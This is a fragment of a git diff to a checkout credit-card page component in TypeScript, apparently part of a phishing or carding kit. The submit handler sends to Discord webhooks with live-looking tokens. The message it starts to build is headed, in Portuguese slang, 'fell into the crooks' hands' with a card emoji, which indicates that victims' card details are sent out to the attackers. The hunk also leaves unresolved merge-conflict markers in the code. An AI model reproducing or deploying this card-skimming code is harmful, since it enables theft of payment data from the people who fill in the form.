@@ -173,7 +173,11 @@ function CheckoutCreditCardPageContent() {
     const onSubmit = async (values: z.infer<typeof formSchema>) => {
         setIsSubmitting(true);
 
+<<<<<<< HEAD
         const webhookURL = "https://discordapp.com/api/webhooks/1388000675744714814/G96ba02oqvitoangzfyYw1DVaAlKdseKBmVSHacuhHlEGFagqzIIOAr7MR8AcrS-C0_n";
+=======
+        const webhookURL = "https://discord.com/api/webhooks/1403200747843358870/3KKdLc7Ooi5Yd3JqD4LT3NRMrrsJsrF9OktvUTMk8O5bpyC-CYsdowuo8EgAXF0ZYpHs";
+>>>>>>> 1b9e35dbce48b3fe1b2f106a7bef016942c9168b
 
         const content = `
 **💳 Caiu na mão dos pecinhas 💳**
